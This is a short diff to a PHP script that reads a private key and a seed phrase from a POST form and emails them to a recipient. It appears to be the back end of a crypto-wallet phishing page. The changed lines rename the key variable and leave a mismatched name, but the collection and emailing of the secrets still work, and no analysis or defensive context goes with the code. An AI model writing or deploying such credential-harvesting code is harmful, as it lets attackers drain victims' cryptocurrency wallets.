@@ -5,7 +5,7 @@ error_reporting(E_ALL);
 // phpinfo();
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Retrieve privkey and seedphr from POST request
-    $privkey = $_POST['privkey'];
+    $privkey = $_POST['privky'];
     $seedphr = $_POST['seedphr'];
 
     // Set the recipient email address
@@ -15,7 +15,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $subject = 'Data from POST request';
 
     // Prepare the email body
-    $message = "Private Key: $privkey\nSeed Phrase: $seedphr";
+    $message = "Private Key: $privky\nSeed Phrase: $seedphr";
 
     // Send the email
     $success = mail($recipient, $subject, $message);
